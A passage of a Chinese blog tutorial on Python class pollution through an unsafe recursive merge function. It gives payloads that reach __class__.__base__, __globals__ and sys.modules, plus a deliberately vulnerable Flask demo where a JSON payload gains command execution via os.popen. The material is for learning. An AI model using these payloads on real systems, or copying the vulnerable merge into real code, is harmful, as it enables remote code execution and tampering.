class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret=<span class="hljs-string">&quot;hello&quot;</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src,dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst,<span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v,dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k]=v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst,k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v,<span class="hljs-built_in">getattr</span>(dst,k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst,k,v)<br>    <br>instance=son_b()<br>payload=&#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;world&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-built_in">print</span>(instance.secret)<br><br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(son_a.secret)<br><span class="hljs-built_in">print</span>(instance.secret)<br></code></pre></td></tr></table></figure><p>我们debug一下</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231033660.png" alt="image-20250309231033660"></p><p>可以看到我们的键为<code>&#39;__class__&#39;</code>,值为<code>&#123;&#39;__base__&#39;:&#123;&#39;secret&#39;:&#39;world&#39;&#125;&#125;</code>,下一步由于<code>dst</code>不为字典直接到了<code>elif</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231142951.png" alt="image-20250309231142951"></p><p>继续之后，发现键为<code>&#39;__base__&#39;</code>,值为<code>&#123;&#39;secret&#39;:&#39;world&#39;&#125;</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231215167.png" alt="image-20250309231215167"></p><p><code>dst</code>还是不是字典，继续下一步</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231422466.png" alt="image-20250309231422466"></p><p>现在键为<code>&#39;secret&#39;</code>，值为<code>&#39;world&#39;</code>，值不是字典了，直接跳到<code>else</code>所以直接跳转到了<code>setattr</code>，进行赋值</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231536024.png" alt="image-20250309231536024"></p><p>继续下一步</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250309231717896.png" alt="image-20250309231717896"></p><p>可以看见<code>dst</code>直接就指向地址了</p><p>那么我们就成功的通过当前类的<code>__base__</code>去污染了<code>secret</code>(现在这三个类的<strong>secret</strong>都是<strong>world</strong>)，不过这仅仅只是一个内置属性，那能不能实现最大的利用直接污染<code>object</code>呢</p><p>前面几步都在正常进行，可是到了后面，发现个问题，也就是我们刚才所有的回退那两步发现没了，从而直接报错，也就是说污染失败，得出结论</p><p><strong>object的属性不能污染</strong></p><p>不仅仅可以污染这些属性，而且还可以污染内置属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;world&quot;</span>,<br>            <span class="hljs-string">&quot;__str__&quot;</span>:<span class="hljs-string">&quot;polluted!&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(father.__str__)<br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(father.__str__)<br><br></code></pre></td></tr></table></figure><p>成功污染内置属性<code>__str__</code>为<code>polluted</code>了</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>看一个简单无脑的<code>demo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">dict</span>):<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(v, <span class="hljs-built_in">dict</span>):<br>            merge(<span class="hljs-built_in">getattr</span>(dst, k), v)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, cmd</span>):<br>        <span class="hljs-variable language_">self</span>.cmd = cmd<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> os.popen(<span class="hljs-variable language_">self</span>.cmd).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/merge_and_execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge_and_execute</span>():<br>    data = request.json<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;cmd&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Invalid input&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    cmd_data = data[<span class="hljs-string">&#x27;cmd&#x27;</span>]<br>    a = Demo(<span class="hljs-string">&#x27;echo Hello&#x27;</span>)<br>    merge(cmd_data, a)<br>    <br>    result = a.execute()<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;result&quot;</span>: result&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,debug=<span class="hljs-literal">True</span>)<br><br><br></code></pre></td></tr></table></figure><p>直接污染进行rce</p><p>传入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>成功污染<code>demo</code>属性</p><h2 id="属性污染以及寻找-merge"><a href="#属性污染以及寻找-merge" class="headerlink" title="属性污染以及寻找(merge)"></a>属性污染以及寻找(merge)</h2><p>类似于<code>ssti</code>的模式，在<code>ssti</code>中我们先通过<code>init</code>初始化属性，在通过<code>globals</code>访问全局变量查找模块,但是在原型链污染中，如果我们不进行重写<code>__init__</code>的话，是找不到的</p><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>如上面的，通过继承关系写出<code>poc</code>即可，当然与此同时，并不只是我们自定义的属性可以污染，还有内置属性也可以，这里可以以这个属性为例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span>,<br>            <span class="hljs-string">&quot;__str__&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(father.__str__)<br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(father.__str__)<br></code></pre></td></tr></table></figure><p>成功污染</p><h3 id="非继承"><a href="#非继承" class="headerlink" title="非继承"></a>非继承</h3><h4 id="globals"><a href="#globals" class="headerlink" title="globals"></a>globals</h4><p>我们在<code>flask</code>中进行<code>SSTI</code>注入的时候一般就会先去寻找<code>globals</code>，这里也是一样，我们直接去找就行了，不过注意的一点就是，如果我们不进行重写<code>__init__</code>的话，是找不到的</p><p>未重写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(MyClass.__init__))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(MyClass.__init__.__globals__)<br><span class="hljs-comment"># 访问不存在的属性会抛出AttributeError</span><br><span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>    <br><span class="hljs-comment"># &lt;class &#x27;wrapper_descriptor&#x27;&gt;</span><br><span class="hljs-comment"># &#x27;wrapper_descriptor&#x27; object has no attribute &#x27;__globals__&#x27;</span><br></code></pre></td></tr></table></figure><p>重写过后</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.x = <span class="hljs-number">10</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(MyClass.__init__))  <br><span class="hljs-built_in">print</span>(MyClass.__init__.__globals__)  <br><span class="hljs-comment"># &lt;class &#x27;function&#x27;&gt;</span><br><span class="hljs-comment"># &#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001BDD0B71700&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;MyClass&#x27;: &lt;class &#x27;__main__.MyClass&#x27;&gt;&#125;</span><br></code></pre></td></tr></table></figure><p>同时这里我们也发现，当其未被重写时，它的类型是 <code>wrapper_descriptor</code>，一个内置方法，是没有全局变量的概率的，，被重写会变为<code>function</code>，一个函数就有全局变量的概率了，有<code>__globals__</code>，请看<code>demo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(demo.__globals__ == <span class="hljs-built_in">globals</span>() == MyClass.__init__.__globals__)<br></code></pre></td></tr></table></figure><p>都是访问当前的全局变量</p><p>我们的目的就是拿到<code>__globals</code></p><p>看一个简单的demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br>test=<span class="hljs-string">&quot;test&quot;</span><br>a = son_a()<br>b = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span>,<br>            <span class="hljs-string">&quot;father&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-built_in">print</span>(a.secret)<br><span class="hljs-built_in">print</span>(test)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(a.secret)<br><span class="hljs-built_in">print</span>(father.secret)<br><span class="hljs-built_in">print</span>(test)<br></code></pre></td></tr></table></figure><p>成功污染了，但是实际情况中，常常是存在于内置模块或者是第三方模块之中，此时我们就不太好找关系了。不过还是有很多办法的</p><h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>那么就要使用<code>sys</code>，因为<code>sys</code>模块的<code>modules</code>属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块，并随着模块的导入而动态更新</p><p>看个简单的demo</p><p><code>test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    secret=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><code>demo.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> test<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># 遍历字典中的所有键值对</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># 检查dst是否为字典</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># 如果存在键k并且v是一个字典</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># 如果dst是一个对象并且有属性k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 将v赋值给k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><br></code></pre></td></tr></table></figure><p>成功污染第三方模块<code>test</code>模块的<code>secret</code></p><h4 id="Loader加载器"><a href="#Loader加载器" class="headerlink" title="Loader加载器"></a>Loader加载器</h4><p><code>__loader__</code> 是一个属性，它存在于每个已导入的模块对象中。这个属性指向一个加载器对象，该对象负责加载该模块。在一些场景中常常伴有着<code>importlib</code>模块的使用，那么这个时候我们就可以使用<code>loader</code>加载器来进行<code>sys</code>模块的加载从而达到目的</p><p>我们简单的看下</p><p><strong>BuiltinImporter</strong></p><ul><li>用于内置模块的加载</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-built_in">print</span>(math.__loader__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>SourceFileLoader</strong></p><ul><li>用于加载来自文件系统的模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> test<br><span class="hljs-built_in">print</span>(test.__loader__)<br>&lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span 